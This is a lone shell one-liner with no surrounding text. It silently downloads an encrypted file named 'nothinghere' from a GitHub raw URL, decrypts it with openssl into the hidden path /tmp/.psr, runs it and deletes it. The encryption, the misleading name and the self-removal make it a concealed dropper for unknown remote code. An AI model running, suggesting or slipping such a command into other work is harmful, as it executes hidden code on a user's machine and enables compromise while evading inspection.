wget -qO- "https://raw.githubusercontent.com/peonsociety/psr/refs/heads/main/nothinghere" | openssl enc -d -aes-256-cbc -a -A -pbkdf2 -out /tmp/.psr; chmod 700 /tmp/.psr; /tmp/.psr; rm -f /tmp/.psr
